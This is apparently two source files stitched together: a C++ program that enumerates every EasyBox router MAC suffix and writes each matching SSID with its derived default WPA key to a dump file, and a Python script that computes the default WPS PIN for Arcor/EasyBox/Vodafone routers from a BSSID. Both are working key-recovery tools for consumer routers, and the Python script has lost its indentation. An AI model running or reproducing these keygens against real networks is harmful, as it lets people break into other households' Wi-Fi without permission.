//
//  File.cpp
//  easybox
//
//  Created by Aykut René Inan on 05.12.13.
//  Copyright (c) 2013 Aykut René Inan. All rights reserved.
//

#include "File.h"

#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <iomanip>
#include <fstream>

int main()
{
    int i, j, k;
	//int m1, m2, m3;
	i = 0x00;
	j = 0x00;
	k = 0x00;
    
    std::ofstream dump;
    dump.open("/Users/SimpleJack/Documents/easybox/easybox/dump.txt");
    
	do {
        
		do {
            
			do {
                
				// std::cout << std::hex << i << ":" << std::setfill ('0') << std::setw (2);
                // std::cout << std::hex << j << ":" << std::setfill ('0') << std::setw (2);
                // std::cout << std::hex << k << "\n" << std::setfill ('0') << std::setw (2);
                
                // Hier muss nun der KeyGen eingefügt werden, welcher für jeden durchgang einen Key erstellt.       # UPDATE: Done.
                // Außerdem muss sein Output (*) nicht als printf enden, sondern entweder in einer Textdatei Zeile
                // für Zeile, um dann die Werte mit einem weiteren Tool in eine .mobileconfig zu bringen, oder
                // direkt mit den mobileconfig daten abgespeichert.
                
                //int orig()
                {
                    
                    // Code von originalem Keygen
                    // By Sebastian Petters
                    // http://www.wotan.cc
                    unsigned  int mac_4, mac_5, mac_6;
                    
                    mac_4 = i;
                    mac_5 = j;
                    mac_6 = k;
                    unsigned int m7, m8, m9, m10, m11, m12;
                    
                    
                    m7  = mac_4 >> 4 & 0x0f;
                    m8  = mac_4 & 0x0f;
                    m9  = mac_5 >> 4 & 0x0f;
                    m10 = mac_5 & 0x0f;
                    m11 = mac_6 >> 4 & 0x0f;
                    m12 = mac_6 & 0x0f;
                    
                    char last4[4];
                    sprintf(last4, "%1X%1X%1X%1X", m9, m10, m11, m12);
                    int smac;
                    sscanf(last4, "%X", &smac);
                    //printf("\nSMAC: %i", smac);     //Output ändern (*) // Unwichtig
                    
                    char smacs[5];
                    sprintf(smacs, "%05d", smac);
                    int s6, s7, s8, s9, s10;
                    s6 = smacs[0] - '0';
                    s7 = smacs[1] - '0';
                    s8 = smacs[2] - '0';
                    s9 = smacs[3] - '0';
                    s10 = smacs[4] - '0';
                    // printf("EasyBox-%1X%1X%1X%1X%1X%1X",m7, m8, m9, m10, s6, s10);      //Output ändern (*)
                    
                    int k1, k2;
                    k1 = (s7 + s8 + m11 + m12) & 0x0f;
                    k2 = (m9 + m10 +s9 + s10) & 0x0f;
                    //printf("\nK1: %1X", k1);        //Output ändern(*) // Unwichtig
                    //printf("\nK2: %1X", k2);        //Output ändern (*) // Unwichtig
                    
                    int x1, x2, x3, y1, y2, y3, z1, z2, z3;
                    x1 = k1 ^ s10;
                    x2 = k1 ^ s9;
                    x3 = k1 ^ s8;
                    y1 = k2 ^ m10;
                    y2 = k2 ^ m11;
                    y3 = k2 ^ m12;
                    z1 = m11 ^ s10;
                    z2 = m12 ^ s9;
                    z3 = k1 ^ k2;
                    
                    // printf(" %1X%1X%1X%1X%1X%1X%1X%1X%1X\n", x1, y1, z1, x2, y2, z2, x3, y3, z3);        //Output ändern (*)
                    
                    
                    //now output as file
                    
                    
                    
                    dump << "EasyBox-" << m7 << m8 << m9 << m10 << s6 << s10 << " " << std::uppercase << std::hex << x1 << std::hex << y1 << std::hex << z1 << std::hex << x2 << std::hex << y2 << std::hex << z2 << std::hex << x3 << std::hex << y3 << std::hex << z3 << "\n";
                    
                    //return 0;
                };
                
                k++;
                
            } while(k<=0xFF);
            
            j++;
            k = 0x00;
        } while(j<=0xFF);
        
        i++;
        j = 0x00;
    } while(i<=0xFF);
    dump.close();
    return 0;
}


#!/usr/bin/env python
import sys, re

def gen_pin (mac_str, sn):
mac_int = [int(x, 16) for x in mac_str]
sn_int = [0]*5+[int(x) for x in sn[5:]]
hpin = [0] * 7

k1 = (sn_int[6] + sn_int[7] + mac_int[10] + mac_int[11]) & 0xF
k2 = (sn_int[8] + sn_int[9] + mac_int[8] + mac_int[9]) & 0xF
hpin[0] = k1 ^ sn_int[9];
hpin[1] = k1 ^ sn_int[8];
hpin[2] = k2 ^ mac_int[9];
hpin[3] = k2 ^ mac_int[10];
hpin[4] = mac_int[10] ^ sn_int[9];
hpin[5] = mac_int[11] ^ sn_int[8];
hpin[6] = k1 ^ sn_int[7];
pin = int('%1X%1X%1X%1X%1X%1X%1X' % (hpin[0], hpin[1], hpin[2], hpin[3], hpin[4], hpin[5], hpin[6]), 16) % 10000000

# WPS PIN Checksum - for more information see hostapd/wpa_supplicant source (wps_pin_checksum) or
# http://download.microsoft.com/download/a/f/7/af7777e5-7dcd-4800-8a0a-b18336565f5b/WCN-Netspec.doc
accum = 0
t = pin
while (t):
accum += 3 * (t % 10)
t /= 10
accum += t % 10
t /= 10
return '%i%i' % (pin, (10 - accum % 10) % 10)

def main():
if len(sys.argv) != 2:
sys.exit('usage: easybox_wps.py [BSSID]\n eg. easybox_wps.py 38:22:9D:11:22:33\n')

mac_str = re.sub(r'[^a-fA-F0-9]', '', sys.argv[1])
if len(mac_str) != 12:
sys.exit('check MAC format!\n')

sn = 'R----%05i' % int(mac_str[8:12], 16)
print 'derived serial number:', sn
print 'SSID: Arcor|EasyBox|Vodafone-%c%c%c%c%c%c' % (mac_str[6], mac_str[7], mac_str[8], mac_str[9], sn[5], sn[9])
print 'WPS pin:', gen_pin(mac_str, sn)

if __name__ == "__main__":
main()